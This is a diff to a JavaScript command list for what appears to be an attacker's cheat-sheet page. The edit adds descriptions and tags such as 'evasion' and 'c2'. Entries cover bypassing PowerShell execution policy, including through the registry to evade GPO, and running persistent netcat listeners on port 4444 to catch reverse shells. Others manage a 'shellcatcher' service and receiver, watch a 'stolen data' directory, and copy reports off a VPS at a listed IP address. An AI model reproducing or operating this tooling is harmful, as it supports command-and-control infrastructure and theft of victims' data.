@@ -259,138 +259,161 @@
 const COMMANDS = [
   {
     title: "Check Execution Policies",
+    desc: "Shows PowerShell execution policy for all scopes. Restricted = can't run scripts.",
     code: "Get-ExecutionPolicy -List",
-    tags: ["ps"],
+    tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Set Execution Policy - All Scopes",
+    desc: "Bypasses script restrictions for all scopes. Run as Admin for LocalMachine.",
     code: "Set-ExecutionPolicy Bypass -Scope Process -Force\nSet-ExecutionPolicy Bypass -Scope CurrentUser -Force\nSet-ExecutionPolicy Bypass -Scope LocalMachine -Force",
-    tags: ["ps"],
+    tags: ["ps", "evasion"],
     accent: "#00f0ff"
   },
   {
     title: "Set Execution Policy via Registry",
+    desc: "Sets execution policy via registry. Persists and may bypass GPO restrictions.",
     code: "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell' -Name 'ExecutionPolicy' -Value 'Bypass' -Force",
-    tags: ["ps"],
+    tags: ["ps", "evasion"],
     accent: "#00f0ff"
   },
   {
     title: "Show File Extensions",
+    desc: "Shows file extensions in Explorer. Helps spot double-extension tricks.",
     code: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name HideFileExt -Value 0\nStop-Process -Name explorer -Force",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Show SuperHidden Files",
+    desc: "Shows system/hidden files. Reveals attacker-hidden files.",
     code: "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" -Name \"ShowSuperHidden\" -Value 1\nStop-Process -Name explorer -Force",
-    tags: ["ps"],
+    tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Check Defender Detections",
+    desc: "Lists recent Defender detections. Shows what got caught and when.",
     code: "Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime -Descending | Select-Object -First 10",
-    tags: ["defender", "ps"],
+    tags: ["defender", "ps", "recon"],
     accent: "#ff2a6d"
   },
   {
     title: "Attach to Shellcatcher Screen",
+    desc: "Reattaches to existing shellcatcher screen session on VPS.",
     code: "screen -r shellcatcher",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "c2"],
     accent: "#ffee00"
   },
   {
     title: "Detach from Screen",
+    desc: "Detaches from screen without killing it. Session keeps running.",
     code: "Ctrl+A, then D",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "List Screen Sessions",
+    desc: "Shows all running screen sessions. Use screen -r NAME to attach.",
     code: "screen -ls",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "recon"],
     accent: "#ffee00"
   },
   {
     title: "Kill All Screen Sessions Named 'shells'",
+    desc: "Terminates all screen sessions named 'shells'. Clean up old listeners.",
     code: "screen -ls | grep shells | cut -d. -f1 | xargs -I {} screen -X -S {}.shells quit",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "Start Netcat Listener (screen)",
+    desc: "Starts persistent nc listener in detached screen. Auto-restarts on disconnect.",
     code: "screen -dmS shells bash -c 'while true; do nc -lvnp 4444; sleep 2; done'",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "c2"],
     accent: "#ffee00"
   },
   {
     title: "Check Listening Ports",
+    desc: "Shows what's listening on common C2 ports. Verify services are up.",
     code: "ss -tlnp | grep -E \"8081|8082|4444\"",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "recon"],
     accent: "#ffee00"
   },
   {
     title: "Check Shellcatcher Service Status",
+    desc: "Shows if shellcatcher systemd service is running. Green = active.",
     code: "systemctl status shellcatcher",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "recon"],
     accent: "#ffee00"
   },
   {
     title: "Restart Shellcatcher",
+    desc: "Restarts shellcatcher service. Use if connections failing.",
     code: "systemctl restart shellcatcher",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "Watch Shellcatcher Logs",
+    desc: "Streams shellcatcher logs live. Shows incoming connections.",
     code: "journalctl -u shellcatcher -f",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "recon"],
     accent: "#ffee00"
   },
   {
     title: "Check Receiver Process",
+    desc: "Shows if receiver.py is running. Check PID and memory usage.",
     code: "ps aux | grep receiver",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "recon"],
     accent: "#ffee00"
   },
   {
     title: "Start Receiver (background)",
+    desc: "Starts receiver.py in background. Logs to receiver.log.",
     code: "cd /opt\npython3 receiver.py > receiver.log 2>&1 &",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "c2"],
     accent: "#ffee00"
   },
   {
     title: "Watch Stolen Data Directory",
+    desc: "Refreshes directory listing every 2 seconds. See new files arrive.",
     code: "watch -n 2 'ls -la /opt/reports/'",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "recon"],
     accent: "#ffee00"
   },
   {
     title: "Kill All Netcat Processes",
+    desc: "Kills all nc processes. Frees up ports for new listeners.",
     code: "killall nc",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "Check Firewall (ufw)",
+    desc: "Shows UFW status and allows common C2 ports. Run after VPS setup.",
     code: "ufw status\nufw allow 4444\nufw allow 8081",
-    tags: ["vps", "linux"],
+    tags: ["vps", "linux", "firewall"],
     accent: "#ffee00"
   },
   {
     title: "SCP from VPS",
+    desc: "Downloads /opt/reports/ folder from VPS to current directory.",
     code: "scp -r root@168.144.166.97:/opt/reports/ .",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "Python HTTP Server",
+    desc: "Quick HTTP server on port 8080. Serves current directory.",
     code: "python -m http.server 8080",
-    tags: ["linux"],
+    tags: ["linux", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Git Add + Commit + Push",
+    desc: "Standard git workflow. Replace 'message' with commit description.",
     code: "git add .\ngit commit -m \"message\"\ngit push origin master",
     tags: ["git"],
     accent: "#c0c0c0"
